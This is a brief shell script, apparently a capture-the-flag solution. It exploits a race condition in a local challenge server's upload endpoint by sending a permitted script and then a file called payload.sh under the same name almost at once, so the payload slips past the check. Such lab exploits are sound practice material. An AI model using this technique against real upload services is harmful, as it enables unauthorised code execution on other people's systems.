#!/bin/sh

host="http://localhost:8080"
allowed_script="chal/static/files/date.sh"
payload="payload.sh"

curl -F "file=@$allowed_script;filename=a.sh" "$host/upload" &
sleep 0.1
curl -F "file=@$payload;filename=a.sh" "$host/upload"
